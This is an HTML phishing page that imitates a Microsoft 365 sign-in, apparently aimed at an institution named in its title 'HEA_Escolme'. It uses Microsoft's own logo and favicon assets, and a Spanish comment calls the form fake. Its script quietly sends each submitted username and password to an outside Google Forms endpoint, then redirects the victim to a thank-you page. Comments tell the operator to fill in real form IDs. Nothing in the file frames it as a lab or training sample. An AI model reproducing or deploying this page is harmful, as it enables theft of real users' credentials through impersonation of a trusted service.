<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Microsoft 365.HEA_Escolme</title>
  <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 380px;
      padding: 30px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .logo {
      width: 120px;
      display: block;
      margin: 0 auto 20px auto;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    .form-group {
      margin: 15px 0;
    }
    input {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0067b8;
      border: none;
      color: white;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }
    button:hover {
      background-color: #005a9e;
    }
    .helper {
      text-align: center;
      margin-top: 10px;
      font-size: 14px;
    }
    .helper a {
      color: #0067b8;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Logo">
    <h2>Microsoft 365.HEA_Escolme</h2>
    
    <!-- Formulario falso -->
    <form id="login-form" autocomplete="off">
      <div class="form-group">
        <input type="text" name="usuario" placeholder="Username or Email" required>
      </div>
      <div class="form-group">
        <input type="password" name="clave" placeholder="Password" required>
      </div>
      <button type="submit">Sign in</button>
    </form>
    
    <div class="helper">
      <a href="#">Forgot password?</a>
    </div>
  </div>

  <!-- SCRIPT: Envía a Google Forms -->
  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const usuario = this.usuario.value.trim();
      const clave = this.clave.value;

      // === REEMPLAZA ESTOS VALORES CON LOS REALES ===
      const FORM_ID = '1FAIpQLSdXwih-UklppDi16aQDXJVjro25aQyXyXa4LU4cPAAlb_mWCQ';
      const ENTRY_USUARIO = 'entry.123456789';  // ← CAMBIAR
      const ENTRY_CLAVE = 'entry.987654321';    // ← CAMBIAR

      const url = `https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?` +
                  `${ENTRY_USUARIO}=${encodeURIComponent(usuario)}&` +
                  `${ENTRY_CLAVE}=${encodeURIComponent(clave)}`;

      // Envío silencioso
      fetch(url, { method: 'GET', mode: 'no-cors' })
        .catch(() => {});

      // Redirige (puedes cambiar a office.com)
      setTimeout(() => {
        window.location.href = 'thankyou.html';
      }, 600);
    });
  </script>
</body>
</html>
